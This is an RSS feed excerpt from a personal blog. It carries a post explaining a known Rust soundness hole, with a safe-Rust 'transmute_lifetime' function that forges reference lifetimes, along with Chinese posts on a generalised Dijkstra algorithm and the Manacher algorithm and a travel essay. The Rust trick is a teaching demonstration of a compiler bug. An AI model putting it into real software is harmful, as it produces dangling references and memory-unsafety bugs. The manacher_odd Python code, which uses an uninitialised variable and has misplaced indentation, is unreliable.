      <content:encoded><![CDATA[<p >Do you believe that one can write a function in safe Rust which can arbitrarily change the lifetime of a reference? For clarity, try to implement the following function without using <code>unsafe</code>:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">transmute_lifetime</span>&lt;<span class="hljs-symbol">&#x27;a</span>, <span class="hljs-symbol">&#x27;b</span>&gt;(x: &amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-type">u64</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;b</span> <span class="hljs-type">u64</span> { todo!() }</span><br></pre></div></div><p  class="par"> Such intention seems to violate the fundamental principle of Rust’s lifetime system, which is to prevent dangling references and data. However, it is possible to write such a function in safe Rust, and it is not even that hard:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">Trait</span> {</span><br><span class="line">    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Output</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span>&lt;T: ?<span class="hljs-built_in">Sized</span>&gt; Trait <span class="hljs-keyword">for</span> <span class="hljs-title class_">T</span> {</span><br><span class="line">    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Output</span> = &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">u64</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">foo</span>&lt;<span class="hljs-symbol">&#x27;a</span>, T: ?<span class="hljs-built_in">Sized</span>&gt;(x: &lt;T <span class="hljs-keyword">as</span> Trait&gt;::Output) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-type">u64</span> { x }</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">transmute_lifetime</span>&lt;<span class="hljs-symbol">&#x27;a</span>, <span class="hljs-symbol">&#x27;b</span>&gt;(x: &amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-type">u64</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;b</span> <span class="hljs-type">u64</span> {</span><br><span class="line">    foo::&lt;<span class="hljs-keyword">dyn</span> Trait&lt;Output=&amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-type">u64</span>&gt;&gt;(x)</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> WOAH! There’s a lot of magic going on here. This is from my recent discovery of a Github issue <a href="https://github.com/rust-lang/rust/issues/57893#issuecomment-500247278">Coherence can be bypassed by an indirect impl for a trait object</a>, which is a quite enjoyable reading down the rabbit hole.</p><p >Let’s break down the code step by step.</p><h2 id="the-trait-trait">The <code>Trait</code> trait</h2><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">Trait</span> {</span><br><span class="line">    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Output</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span>&lt;T: ?<span class="hljs-built_in">Sized</span>&gt; Trait <span class="hljs-keyword">for</span> <span class="hljs-title class_">T</span> {</span><br><span class="line">    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Output</span> = &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">u64</span>;</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The first part defines a trait <code>Trait</code> with an associated type <code>Output</code>. As a reminder, let’s recap on the concept of associated types:</p><ol><li>An associated type is a type that is associated with a trait, and must be specified by the trait implementor. </li><li>The associated type of a trait is unique for each implementor, i.e., a type <code>T</code> cannot implement <code>Trait&lt;Output=O1&gt;</code> and <code>Trait&lt;Output=O2&gt;</code> at the same time, which is different from the generic type parameters.</li><li>Given the uniqueness mentioned above, one can access the associated type of a trait by using the syntax <code>&lt;T as Trait&gt;::Output</code>, which resolves to a concrete type.</li></ol><p  class="par"> What’s interesting is that we have <code>Trait</code> implemented for all types <code>T: ?Sized</code>, in which the associated type <code>Output</code> is set to <code>&amp;&#39;static u64</code>. This implies for any type <code>T</code>, including those dynamically sized, is now a subtype of <code>Trait</code>, and <code>&lt;T as Trait&gt;::Output</code> should resolve to <code>&amp;&#39;static u64</code>.</p><p >Hence, we have the validity of the <code>foo</code> function.</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">foo</span>&lt;<span class="hljs-symbol">&#x27;a</span>, T: ?<span class="hljs-built_in">Sized</span>&gt;(x: &lt;T <span class="hljs-keyword">as</span> Trait&gt;::Output) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-type">u64</span> { x }</span><br></pre></div></div><p  class="par"> Since <code>&lt;T as Trait&gt;::Output</code> should always be <code>&amp;&#39;static u64</code>, variable <code>x</code> of that type can be safely cast to <code>&amp;&#39;a u64</code> without any lifetime issues.</p><p >So far so good, until we enter the territory of <code>dyn ...</code> types, aka the trait objects.</p><h2 id="the-trait-objects">The Trait Objects</h2><p >Trait objects is a way to abstract over types that implement a trait, denoted as <code>dyn Trait</code> which is a special type in Rust and enables dynamic dispatch at runtime. We may consider an implicit implementation is generated for every trait object type as:</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Trait</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">dyn</span> Trait { ... }</span><br></pre></div></div><p  class="par"> Specially, if a trait <code>Trait</code> contains associated types, a bare <code>dyn Trait</code> is not allowed. Instead we need to specify the associated types explicitly, e.g., <code>dyn Trait&lt;Output=...&gt;</code>. Similar to above, an imaginary implementation is generated for this case as:</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">impl</span>&lt;O&gt; Trait <span class="hljs-keyword">for</span> <span class="hljs-title class_">dyn</span> Trait&lt;Output=O&gt; { <span class="hljs-keyword">type</span> <span class="hljs-title class_">Output</span> = O; }</span><br></pre></div></div><p >Now let’s think about a question: <strong>Does trait object type belong to “any type”?</strong></p><p >This matters since if it does, our aforementioned <code>impl&lt;T: ?Sized&gt; Trait for T</code> should also apply to <code>dyn Trait</code> types, which means the following implementation also exists:</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">impl</span>&lt;O&gt; Trait <span class="hljs-keyword">for</span> <span class="hljs-title class_">dyn</span> Trait&lt;Output=O&gt; { <span class="hljs-keyword">type</span> <span class="hljs-title class_">Output</span> = &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">u64</span>; }</span><br></pre></div></div><p  class="par"> which contradicts the previous one! Unfortunately, Rust does not prevent this from happening, and the compiler will not complain about it. By exploiting this, we can write the legendary <code>transmute_lifetime</code> function.</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">transmute_lifetime</span>&lt;<span class="hljs-symbol">&#x27;a</span>, <span class="hljs-symbol">&#x27;b</span>&gt;(x: &amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-type">u64</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;b</span> <span class="hljs-type">u64</span> {</span><br><span class="line">    foo::&lt;<span class="hljs-keyword">dyn</span> Trait&lt;Output=&amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-type">u64</span>&gt;&gt;(x)</span><br><span class="line">}</span><br></pre></div></div><p  class="nomargin"> The snippet is legitimized as explained by @nikomatsakis <a href="https://github.com/rust-lang/rust/issues/57893#issuecomment-510690333">in the Github issue</a>:</p><blockquote><p  class="par"> Now the problem is that different parts of the compiler could select different impls, resulting in distinct values for <code>Output</code>. In @Centril’s example (#57893 (comment)), there is a helper function foo which only knows that it has some <code>T: ?Sized</code>, so it uses the user’s impl to resolve <code>Output</code>.[…]</p><p >On the other hand, the <code>transmute_lifetime</code> function invokes <code>foo</code> with the type <code>dyn Object&lt;Output=&amp;&#39;a u64&gt;</code>. […] This winds up resolving using the “auto-generated” impl, and hence <code>Output</code> is normalized to <code>&amp;&#39;a u64</code>.</p></blockquote><p >This problem remains unsolved since 2019 and is considered a soundness hole in Rust’s type system. The Rust team has been aware of this issue for a long time, but it is not easy to fix. </p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Rust/">Rust</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Type-Theory/">Type Theory</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Programming/">Programming</category>
      
      
      <comments>https://i.hsfzxjy.site/rust-lifetime-transmute-unsoundness/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Dijkstra 算法的延伸</title>
      <link>https://i.hsfzxjy.site/more-thinking-on-dijkstra-algorithm/</link>
      <guid>https://i.hsfzxjy.site/more-thinking-on-dijkstra-algorithm/</guid>
      <pubDate>Sun, 21 Jan 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;我们知道 Dijkstra 算法是一个高效的单源最短路径（SSSP）算法，本文将不再赘述他的细节。但同时，Dijkstra 也是一个动态规划算法。Dijkstra 算法的正确性源自无负边权图的若干性质。如果一个问题本身也满足这些性质，那么即使它不是一个图论最短路径问题，也</description>
        
      
      
      
      <content:encoded><![CDATA[<p >我们知道 Dijkstra 算法是一个高效的单源最短路径（SSSP）算法，本文将不再赘述他的细节。但同时，Dijkstra 也是一个动态规划算法。Dijkstra 算法的正确性源自无负边权图的若干性质。如果一个问题本身也满足这些性质，那么即使它不是一个图论最短路径问题，也可以使用 Dijkstra 算法解决。那么，这些性质是什么呢？</p><h2 id="sssp-问题的延伸">SSSP 问题的延伸</h2><p >我们可以从更加抽象的层次描述 SSSP 问题。设想有一个函数 $W: [n] \times [n] \times \mathbb{R}^+ \mapsto \bar{\mathbb{R}}$，对 $\forall g, g_1, g_2 \in \mathbb{R}^+, g_1 &lt; g_2, i, j \in [n], i \neq j$ 满足以下性质</p><p  class="par"> $$\begin{align}    W(i, i, g) &amp;= 0, \\    W(i, j, g) &amp;\geq 0, \\    W(i, j, g_1) - W(i, j, g_2) &amp;\leq g_2 - g_1 \label{eq:bound}\end{align}$$</p><p  class="par"> $W$ 可以看成一个广义的权值函数，带有一个额外的自变量 $g$。在实际问题中 $g$ 可以是“已走过的距离”等额外参数。而 $\eqref{eq:bound}$ 约束了 $W$ 随着 $g$ 最多只能以线性速度衰减，这对后面的证明是十分必要的。注意 $W$ 的值域是扩充实数域，为了保持一致性，我们额外规定 $\infty - \infty = 0$。</p><p >另一方面，我们记 $[n]$ 中元素构成的子序列的集合为 $\mathcal{U}$</p><p  class="par"> $$\mathcal{U} = \{(a_1, a_2, \ldots, a_k)|k \in \mathbb{N}, a_1, \ldots, a_k \in [n]\}$$</p><p  class="par"> $\mathcal{U}$ 中元素我们用加粗小写字母 $\mathbf{a}, \mathbf{b}$ 表示，$|\mathbf{a}|$ 为 $\mathbf{a}$ 的长度，$a_i$ 为 $\mathbf{a}$ 的第 $i$ 个元素，$\mathbf{a}_{q}$ （如 $\mathbf{a}_{\leq k}$）为 $\mathbf{a}$ 中下标满足条件 $q$ 的元素构成的子序列。同时，我们还定义 $||$ 为序列拼接运算符。有了以上准备，现在我们定义路径长度函数 $L: \mathcal{U} \mapsto \bar{\mathbb{R}}$：</p><p >$$\begin{align}  L(\mathbf{a}) &amp;= W(1, a_1, 0), &amp;\text{if } |\mathbf{a}| = 1; \\  L(\mathbf{a}) &amp;= L(\mathbf{a}_{\leq k-1}) + W(a_{k-1}, a_k, L(\mathbf{a}_{\leq k-1})), &amp;\text{if } |\mathbf{a}| = k \geq 2.\end{align}$$</p><p  class="par"> 现在我们要求解另一个函数 $D: [n] \mapsto \mathbb{R}$，其定义如下</p><p >$$\begin{align}D(u) = \min_{\mathbf{a} \in \mathcal{U}, |\mathbf{a}| \leq n} L(\mathbf{a}||u) \label{eq:D}\end{align}$$</p><p  class="par"> 上述这个问题可以用 Dijkstra 算法求解。在 SSSP 中，$W(i, j, g)$ 即为 $i$ 到 $j$ 的边权，$W(i, j, g)$ 是关于 $g$ 的常函数，$D(i)$ 则是 $i$ 到源点的最短路径。</p><h2 id="延伸问题的求解">延伸问题的求解</h2><p >和 Dijkstra 算法类似，我们维护一个试探性数组 $p: [n] \in \mathbb{R}$。初始时，$p(i) \geq D(i), \forall i$。同时我们维护一个“已求解”的集合 $S$，记其补集 $T = [n] - S$。我们将经过 $n$ 次迭代，逐渐将 $S$ 填满。而在每次迭代开始前，我们会通过某种“更新”机制使 $p$ 满足如下条件：</p><p >$$\begin{align}p(i) &amp;= D(i), &amp;\forall i \in S; \\p(i) &amp;= \min_{j \in S} \left(D(j) + W(j, i, D(j)\right)), &amp;\forall i \in [n].\label{eq:ST}\end{align}$$</p><p  class="par"> 在每次迭代中，我们从 $T$ 中取出</p><p >$$\begin{align}u = \arg\min_{i \in T}d(i)\label{eq:u}\end{align}$$</p><p  class="par">，并认为 $i$ 已经“求解完成”，将其加入 $S$。为什么可以这么做呢？我们可以用以上的条件证明其正确性。</p><p >利用反证法，如果说 $u$ “还未求解完成”，也就是此时 $p(u) &gt; D(u)$。由 $\eqref{eq:D}$ 中 $\mathbf{a}$ 的取值集合有限可知，$\exists \mathbf{a}, |\mathbf{a}|=k$，使得 $D(u) = L(\mathbf{a}||u)$。我们讨论两种情况：</p><p  class="nomargin"> <strong>第一种</strong>，如果 $\mathbf{a} \subset S$，</p><p >$$\begin{align*}    D(u) &amp;&lt; p(u) &amp; 利用 \eqref{eq:ST}\\         &amp;\leq D(a_k) + W(a_k, u, D(a_k)) &amp; 利用 D(a_k) \leq L(\mathbf{a}) 以及 \eqref{eq:bound}\\         &amp;\leq D(a_k) + W(a_k, u, L(\mathbf{a})) + L(\mathbf{a}) - D(a_k) \\         &amp;= W(a_k, u, L(\mathbf{a})) + L(\mathbf{a}) &amp; 利用 D(u) = L(\mathbf{a}||u)\\         &amp;= D(u)\end{align*}$$</p><p  class="par"> 矛盾！</p><p  class="nomargin"> <strong>第二种</strong>，如果诸 $\mathbf{a}$ 中有不属于 $S$ 的元素，假设 $a_j \in T$ 是其中下标最小者。则有</p><p >$$\begin{align*}    p(u) &amp;&gt; D(u) \\         &amp;= L(\mathbf{a}_{&lt;j}||a_j||\mathbf{a}_{&gt;j}||u) \\         &amp;\geq L(\mathbf{a}_{&lt;j}||a_j) \\         &amp;= L(\mathbf{a}_{&lt;j}) + W(a_{j-1}, a_j, L(\mathbf{a}_{&lt;j})) &amp;利用 D(a_{j-1}) &lt; L(\mathbf{a}_{&lt;j})\\         &amp;= L(\mathbf{a}_{&lt;j}) + W(a_{j-1}, a_j, D(a_{j-1})) + D(a_{j-1}) - L(\mathbf{a}_{&lt;j}) \\         &amp;= W(a_{j-1}, a_j, D(a_{j-1})) + D(a_{j-1}) &amp; 利用 a_{j-1} \in S 及 \eqref{eq:ST}\\         &amp;\geq p(a_j)\end{align*}$$</p><p  class="par"> 这与 $u$ 的选取矛盾！故综上，如此选出的 $u$ 一定是“已经求解完成的”。</p><p >选出了 $u$ 后，我们需要以 $u$ 为基点，更新 $Y$ 中其他元素的 $d$ 值。具体而言，对于 $\forall j \in T$，我们作如下更新</p><p >$$p(j) \gets \min(p(j), D(u) + W(u, j, D(u)))$$</p><p  class="par"> 我们可以证明这样的更新方式符合 $\eqref{eq:ST}$ 的要求</p><p >$$\begin{align*}    &amp;\min\left\{p(j), D(u) + W(u, j, D(u))\right\} \\    = &amp;\min\left\{\min_{w \in S}\{D(w)+W(w, j, D(w))\}, D(u, W(u, j, D(u)))\right\} \\    = &amp;\min_{w \in S \cup \{u\}}\{D(w)+W(w, j, D(w))\}\end{align*}$$</p><p  class="par"> 由此可知，Dijkstra 的改进算法可以解决这个延伸问题。</p><h2 id="应用-1">应用</h2><p >前面说过，SSSP 是延伸问题的一个特殊情况。此外，本文的算法还可以用来解决一些特殊的最短路径问题。比如在 <a href="https://leetcode.com/problems/minimum-time-to-visit-a-cell-in-a-grid/description/">LeetCode 2577. Minimum Time to Visit a Cell In a Grid</a> 中，图的边权不是一个常数，而是随着当前已走的距离（或时间）增加而减少，而且减少的幅度不超过线性速度。可以验证，这道题的条件满足上面的约束，因此也可以用 Dijkstra 算法来解决。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/LeetCode/">LeetCode</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Dijkstra/">Dijkstra</category>
      
      
      <comments>https://i.hsfzxjy.site/more-thinking-on-dijkstra-algorithm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Manacher 回文计数算法</title>
      <link>https://i.hsfzxjy.site/Manacher-algorithm/</link>
      <guid>https://i.hsfzxjy.site/Manacher-algorithm/</guid>
      <pubDate>Mon, 15 Jan 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p &gt;以下假设字符串下标从 $0$ 开始，子串记号 $s[i..j]$ 左闭右闭。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p &gt;给定长度为 $n$ 的字符串 $s$，Manacher 算法可以在 $O(n)$ 的时间复杂度内找到 $s$ 的所有回文子串</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p >以下假设字符串下标从 $0$ 开始，子串记号 $s[i..j]$ 左闭右闭。</p></blockquote><p >给定长度为 $n$ 的字符串 $s$，Manacher 算法可以在 $O(n)$ 的时间复杂度内找到 $s$ 的所有回文子串。</p><p >我们先以寻找长度为奇数的子串为例。首先需要明确的是，如果 $s$ 中以第 $i$ 个字符为中心的最长回文子串长度为 $d=2p+1$，则以下皆为 $s$ 的回文子串：</p><p  class="par"> $$s[i-(p-1)..i+(p-1)],\ldots, s[i-1..i+1], s[i..i]$$</p><p  class="par"> 因此，我们只需对所有下标 $i$ 求解出以 $s[i]$ 为中心的最长回文子串长度 $2p_i+1$，即可知道 $s$ 的所有回文子串。</p><p >Manacher 算法从左到右求解诸 $p_i$。在求解 $p_i$ 时，算法会保证诸 $p_0,\ldots,p_{i-1}$已经求解完毕，从而我们可以利用先前的信息合理减少计算。在这个过程中，我们将维护一个滚动的子串 $t=s[l..r]$，$t$ 是目前已探明的右端点最靠右的回文子串。如此一来，每次循环时，我们要考虑两种情况：</p><ol><li><strong>i 在子串 t 内</strong>，即 $l\leq i \leq r$。此时我们考虑 $i$ 在 $t$ 内的镜像点 $j = l+r-i$，则 $p_j$ 是之前已经求解过的。从而知道以 $j$ 为中心的最长子串长度为 $p_j$。但这一知识不能照搬到 $i$ 处，因为 $i+p_j$ 很可能会超过右端点 $r$。为此我们做一个截断，取 $p_i = min(p_j,r-i)$；</li><li><strong>i 不在子串 t 内</strong>，即 $i &gt; r$。此时我们取 $p_i=0$。</li></ol><p  class="par"> 以上得到的 $p_i$ 其实还不是真正的解，因为 $i + p_i$ 的右侧还有未探明的情况。因此我们还需循环自增 $p_i$，直到 $s[i-p_i]\neq s[i+p_i]$。注意到随着 $p_i$ 的扩进，$s[i-p_i..i+p_i]$ 成为了新的端点最右的子串，因此我们还要及时更新 $t$。用 Python 实现的算法如下：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">manacher_odd</span>(<span class="hljs-params">s</span>):</span><br><span class="line">    n = <span class="hljs-built_in">len</span>(s)</span><br><span class="gk-section gk-section" data-gk-sid="BLOCK1.SEC1" data-gk-type="section"data-gk-desc="在前后增加哨兵字符，简化边界情况处理"><span class="line">    s = <span class="hljs-string">&#x27;^&#x27;</span> + s + <span class="hljs-string">&#x27;$&#x27;</span></span><br></span><span class="line">    p = [<span class="hljs-number">0</span>] * n</span><br><span class="line">    i = l = <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, n + <span class="hljs-number">1</span>):</span><br><span class="gk-section gk-section" data-gk-sid="BLOCK1.SEC2" data-gk-type="section"data-gk-desc="此处将获得初始 p[i] 的两种情形合在一起了"><span class="line">        x = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">min</span>(r - i, p[l + r - i]))</span><br></span><span class="line">        <span class="hljs-keyword">while</span> s[i + x] == s[i - x]: x += <span class="hljs-number">1</span></span><br><span class="line">    p[i - <span class="hljs-number">1</span>] = x - <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">if</span> i + x &gt; r:</span><br><span class="line">        l, r = i - x, i + x</span><br><span class="line">    <span class="hljs-keyword">return</span> p</span><br></pre></div></div><p >为什么 Manacher 算法复杂度是 $O(n)$ 呢？我们可以从 $r$ 端点的变化考虑。在每次循环中，$r$ 有两种情形：</p><ol><li><strong>r 不变</strong>，此时 $p_i$ 是直接从其镜像点 $p_j$ 拿到的值，从而第二层的 while 循环没有运行；</li><li><strong>r 增加</strong>，此时第二层的 while 循环执行了，将 $p_i$ 从 $r_\text{old}-i$ 增加到了 $r_\text{new} -i$。</li></ol><p  class="par"> 由此可见，第二层 while 循环的总次数等于 $r$ 从始至终的增量，为 $n$。因此整个算法的时间复杂度为 $O(n)$。</p><p >同样地，我们还能计数 $s$ 中长度为偶数的回文子串。以下为 Python 代码，原理类似：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">manacher_even</span>(<span class="hljs-params">s</span>):</span><br><span class="line">    <span class="hljs-comment"># p[i] 记录了以字符 s[i] 后面的“槽”为中心的最长回文子串的长度的一半。</span></span><br><span class="line">    <span class="hljs-comment"># 如：</span></span><br><span class="line">    <span class="hljs-comment"># s = &quot;aabbc&quot;</span></span><br><span class="line">    <span class="hljs-comment"># p = [1, 0, 1, 0]</span></span><br><span class="line">    n = <span class="hljs-built_in">len</span>(s)</span><br><span class="line">    s = <span class="hljs-string">&#x27;^&#x27;</span> + s + <span class="hljs-string">&#x27;$&#x27;</span></span><br><span class="line">    p = [<span class="hljs-number">0</span>] * (n - <span class="hljs-number">1</span>)</span><br><span class="line">    l = r = <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, n):</span><br><span class="line">        j = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">min</span>(r - i - <span class="hljs-number">1</span>, p[l + r - i - <span class="hljs-number">3</span>]))</span><br><span class="line">        <span class="hljs-keyword">while</span> s[i + j + <span class="hljs-number">1</span>] == s[i - j]:</span><br><span class="line">            j += <span class="hljs-number">1</span></span><br><span class="line">        p[i - <span class="hljs-number">1</span>] = j</span><br><span class="line">        <span class="hljs-keyword">if</span> i + j + <span class="hljs-number">2</span> &gt; r:</span><br><span class="line">            l, r = i - j + <span class="hljs-number">1</span>, i + j + <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">return</span> p</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/LeetCode/">LeetCode</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Algorithm/">Algorithm</category>
      
      <category domain="https://i.hsfzxjy.site/tags/String/">String</category>
      
      
      <comments>https://i.hsfzxjy.site/Manacher-algorithm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>硬卧</title>
      <link>https://i.hsfzxjy.site/train-2023-11-18/</link>
      <guid>https://i.hsfzxjy.site/train-2023-11-18/</guid>
      <pubDate>Sat, 18 Nov 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;我醒了，闹钟仍未响，窗外却已见鱼肚白。从帽子里掏出手机，才六点出头。&lt;/p&gt;
&lt;p &gt;硬卧的床仿佛是量身定制的，不宽不窄，恰能容下一个我。我睡前戴上了连衣的帽子，将手机放在帽子里，既防止手机从上铺跌落，也不怕错过了闹钟——现在看来是多余了。我小心翼翼地侧过身，对面的人还在</description>
        
      
      
      
      <content:encoded><![CDATA[<p >我醒了，闹钟仍未响，窗外却已见鱼肚白。从帽子里掏出手机，才六点出头。</p><p >硬卧的床仿佛是量身定制的，不宽不窄，恰能容下一个我。我睡前戴上了连衣的帽子，将手机放在帽子里，既防止手机从上铺跌落，也不怕错过了闹钟——现在看来是多余了。我小心翼翼地侧过身，对面的人还在熟睡。</p><p >应该快到站了。十三个小时前的傍晚，我才乘高铁来到上海，来看一场期待已久的演唱会。十三个小时后的清晨，我又乘着绿皮车，离开上海回到这里。计划本就是如此，无意多作停留。</p><p >我本不敢奢望此次出行，一是无多闲暇，二是演唱会座票难求。但四天前的一个契机促成了这个计划。演唱会结束已是晚上九点半，赶不上最后一班高铁。倘若在上海住一晚，又将浪费许多时间与花销——那何不乘夜车返程呢？四天前是那么近，以至于我只能买到硬卧的返程票。但即便如此，这突如其来的出行还是让我兴奋到目眩。</p><p >“特种兵式旅行”，当这个词在几个月前被人们热议时，我便能与之共鸣。我太想要这种体验了，尤其是在这三年之后。许多美好的幻想早已寻不见了——事实上它们还在，但只剩一个淡淡的影子，缩在记忆的一隅，像是史前人类篝火的遗迹。倘若没有那段经历，那是我们本该有的样子。</p><p >特种兵式旅行是对幻想的追悼，更是对建制的反抗。建制是社会的契约，约定了人们只能以某法行某事。契约被习惯赋予了强制力。长久以来某事都是这么做的，那它就只能这么做。社会认为旅行该是惬意的，不紧不慢的，特种兵式旅行则展示了其反面也有相当的追随者。</p><p >反抗传统式旅行的动机是多种多样的。精打细算的人视双腿所行之广为崇高利益，想要竭己所能，力求以最短的时间将其最大化。压力负身的人视建制为一体的庞然大物，不能在其坚硬处击破，便在其薄弱处致以无声的呐喊。还有人则为了反抗而反抗，反抗产生的快感像是全糖的奶茶，能满足基因中最原始的渴求。这种游于建制之外的经历，不管出于何心，是快乐而难以忘却的。</p><p >准备下床了。我尝试直起身，但天花板太矮了，根本做不到，转而翻了个身，跪在铺上，慢慢往后退，够到床末的梯子，一阶阶踩下来。转身，窗外天光已大亮。湖光山色，披上朝霞的暖辉，尽收眼底。</p><p >过道上，有人推车叫卖。先是卖早餐的大叔，戴着厨师的高帽，进门时甚至要低一下头。路过时，我望了一眼——车里是一桶稀饭，还有一摞包子馒头，非常简朴的早餐。“这两天有寒潮，天气很冷，大家要吃早餐咧！”大叔吆喝着，但只有一两个人理会。大叔很快穿过了整个车厢，消失在走廊尽头。紧接着是另一辆车，是熟悉的“瓜子饮料矿泉水”。车上像一个微型的小卖部，满满当当的都是零食。人们都才刚起床，自然不想吃零食。推车的人也不多作停留，很快前往了下一节车厢。</p><p >偶尔坐一次硬卧也不错。我想。上一次坐应该还是七年前，我们高中毕业旅行的一个夜晚，在黑龙江和内蒙古交界的某个地方。我们一隔的人畅聊了一路，关于未来，关于彼此的情感。北方的夏天夜很短，聊到天光之际也不过才三点。彻夜未眠，但第二天依旧精力充沛。</p><p >绿皮车于我总有一种浪漫主义的色彩。一方面是我不常坐，距离产生美。另一方面则来自各种作品中的描述——在绿皮车上，天南地北的人聚在一起，大家分享着食物和故事，充满了所谓的“生活气息”。</p><p >但仔细想来，这不过是布尔乔亚式的幻想，幼稚而可笑。歌颂田园牧歌的人看不见在真正在田里劳作的人。硬卧旅途，空间狭小而床铺逼仄，人们脸上都挂着疲惫。车厢连接处，早有人拖着大行李箱焦急等候到站——那是后半夜才上来的旅客，他们乘火车穿越城际，来到省会换乘，甚至是去赶早班的飞机。</p><p >人们不是为了浪漫而搭上这列车，人们只是在努力生活，为了有朝一日能自在地追寻属于自己的浪漫，比如去旅行，比如看演唱会。</p><p >虚假的浪漫在生活面前，不值一提。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      
      <comments>https://i.hsfzxjy.site/train-2023-11-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Go Fact: Zero-sized Field at the Rear of a Struct Has Non-zero Size</title>
      <link>https://i.hsfzxjy.site/zst-at-the-rear-of-go-struct/</link>
      <guid>https://i.hsfzxjy.site/zst-at-the-rear-of-go-struct/</guid>
      <pubDate>Fri, 03 Nov 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;There’s a concept in Golang called &lt;em&gt;zero-sized type&lt;/em&gt; (or ZST), namely, a type whose variables take up zero bit of memory. One of </description>
        
      
      
      
